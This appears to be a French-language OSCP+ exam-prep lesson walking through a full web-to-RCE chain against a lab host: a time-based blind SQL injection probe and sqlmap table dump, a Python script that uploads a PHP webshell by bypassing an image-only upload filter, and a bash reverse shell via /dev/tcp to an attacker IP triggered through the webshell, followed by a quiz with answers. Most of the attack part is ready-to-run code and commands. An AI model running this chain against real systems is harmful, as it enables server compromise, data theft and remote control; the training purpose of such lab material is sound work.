# TOME P7 — Certifications d'Élite & Spécialisations — Jour 301 (6h) : OSCP+ Prep — Web-to-RCE Full Chain (SQLi Time-Based Blind to Webshell, File Upload Bypass, OS Command Injection)

> [!NOTE]
> **Objectif du jour :** Maîtriser la **chaîne d'exploitation Web-to-RCE complète de niveau OSCP+** : exploiter une injection SQL Time-Based Blind pour extraire un hash d'administrateur, contourner les restrictions d'upload de fichiers pour déposer un Webshell PHP, exploiter une injection de commande OS, et établir un Reverse Shell vers un listener Netcat.
>
> **Compétences visées :** `OSCP-01` (A) — SQL Injection Time-Based Blind & OS Command Injection | `OSCP-02` (A) — File Upload Restriction Bypass & Webshell Deployment

---

## 1) Module — SQLi Time-Based Blind avec sqlmap & Extraction Manuelle (2h)

### 📖 Narration/Intuition

Dans l'examen OSCP+, les injections SQL Time-Based Blind se reconnaissent quand une requête malveillante provoque un délai perceptible dans la réponse HTTP plutôt qu'un message d'erreur visible. L'outil `sqlmap` automatise leur exploitation mais **la compréhension manuelle** du payload est impérative pour l'examen.

### 🛠️ Atelier Pratique

```bash
# Payload SQL Injection Time-Based Blind (MySQL)
# Le serveur répond en ~5s si la condition est vraie -> permet l'extraction bit par bit

# Test manuel : l'application est-elle vulnérable à un Time-Based Blind SQLi ?
curl -s -o /dev/null -w "%{time_total}" "http://target.lab/product?id=1' AND SLEEP(5)-- -"
# Si le temps de réponse est > 5 secondes -> VULNÉRABLE !

# Extraction automatisée avec sqlmap
sqlmap -u "http://target.lab/product?id=1" \
    --dbms=mysql \
    --technique=T \
    --batch \
    --dbs
# Puis extraire la table des utilisateurs :
sqlmap -u "http://target.lab/product?id=1" \
    --dbms=mysql -D webapp -T users \
    --dump --batch
```

---

## 2) Module — File Upload Bypass & Webshell PHP (`upload_bypass.py`) (2h)

### 🛠️ Atelier Pratique

```python
import requests

# Contournement du filtre de validation d'upload par manipulation du Content-Type et de l'extension
TARGET_UPLOAD = "http://target.lab/admin/upload"

# Webshell PHP minimal permettant l'exécution de commandes OS via le paramètre ?cmd=
WEBSHELL = b"<?php system($_GET['cmd']); ?>"

# Technique de bypass : Renommer le fichier .php en .php.jpg (double extension)
files = {
    'file': ('shell.php.jpg', WEBSHELL, 'image/jpeg')  # Content-Type image légitime !
}

resp = requests.post(TARGET_UPLOAD, files=files)
print(f"[*] Upload Response : {resp.status_code}")

# Exécution du webshell uploadé
shell_url = "http://target.lab/uploads/shell.php.jpg"
cmd_resp = requests.get(shell_url, params={'cmd': 'id'})
print(f"[+] Résultat de la commande OS : {cmd_resp.text}")
```

---

## 3) Module — Reverse Shell & Stabilisation (2h)

### 🛠️ Obtenir un Reverse Shell Bash & le Stabiliser

```bash
# ═══════════════════════════════════════════════════════
# ÉTAPE 1 — Listener Netcat sur la machine attaquante
# ═══════════════════════════════════════════════════════
nc -lvnp 4444

# ═══════════════════════════════════════════════════════
# ÉTAPE 2 — Déclenchement du Reverse Shell depuis le Webshell
# ═══════════════════════════════════════════════════════
# Via le webshell uploadé : ?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.100/4444+0>%261'
curl "http://target.lab/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.100/4444+0>%261'"

# ═══════════════════════════════════════════════════════
# ÉTAPE 3 — Stabilisation du shell (TTY complet via Python pty)
# ═══════════════════════════════════════════════════════
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **OSCP+** | Offensive Security Certified Professional Plus — Certification d'exploitation offensive de référence mondiale |
| **SQLi T-Based** | SQL Injection Time-Based Blind — Extraction de données via mesure du temps de réponse |
| **Webshell** | Script web malveillant (ex: PHP, ASPX) uploadé sur un serveur pour exécuter des commandes |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Comment une SQL Injection **Time-Based Blind** communique-t-elle l'information extraite à l'attaquant ?
- A) Via un délai artificiellement induit dans la réponse HTTP par l'instruction `SLEEP(N)` ou `WAITFOR DELAY` selon que la condition testée est vraie ou fausse
- B) Via un message d'erreur SQL visible
- C) Via un fichier log sur le serveur
- D) Via une connexion UDP inverse

**Réponse : A**

**Q2 :** Quelle technique permet de contourner un filtre d'upload qui accepte uniquement les fichiers image (`.jpg`) ?
- A) Utiliser une double extension (ex: `shell.php.jpg`) avec un `Content-Type: image/jpeg` légitime
- B) Compresser le fichier en ZIP
- C) Renommer le fichier en `.txt`
- D) Encoder le fichier en Base64

**Réponse : A**

**Q3 :** Dans l'examen OSCP+, pourquoi est-il impératif de **stabiliser** le Reverse Shell obtenu ?
- A) Pour obtenir un TTY interactif complet permettant d'utiliser des commandes interactives comme `su`, `sudo` et de manipuler les signaux Ctrl+C/Z sans perdre le shell
- B) Pour accélérer le débit réseau
- C) Pour chiffrer la connexion
- D) Pour réduire la consommation CPU

**Réponse : A**

**Q4 :** Quelle commande Python3 permet de spawner un shell TTY pleinement interactif depuis un Reverse Shell non-interactif ?
- A) `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- B) `python3 -m http.server 8080`
- C) `python3 -c 'exit()'`
- D) `python3 --version`

**Réponse : A**

**Q5 :** Quel outil open-source automatise l'exploitation des injections SQL (GET/POST/Cookie/Headers) avec détection du SGBD et extraction des données ?
- A) sqlmap
- B) Wireshark
- C) Nmap
- D) Burp Repeater uniquement

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
